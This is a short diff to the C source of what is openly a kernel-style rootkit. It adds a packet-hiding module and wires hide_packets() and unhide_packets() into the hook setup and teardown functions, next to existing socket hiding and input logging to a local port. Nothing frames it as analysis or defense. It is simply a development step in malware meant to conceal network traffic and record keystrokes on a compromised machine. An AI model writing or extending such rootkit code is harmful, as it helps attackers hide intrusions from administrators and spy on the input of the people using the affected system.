@@ -22,6 +22,7 @@
 #include "read.h"
 #include "inputlog.h"
 #include "sockhide.h"
+#include "packhide.h"
 
 extern rootkit_t rootkit;
 
@@ -94,6 +95,8 @@ init_hooks(void)
 
     if (rootkit.logging_input)
         log_input("127.0.0.1", "5000");
+
+    hide_packets();
 }
 
 void
@@ -121,6 +124,8 @@ remove_hooks(void)
 
     if (rootkit.logging_input)
         unlog_input();
+
+    unhide_packets();
 }
 
 void
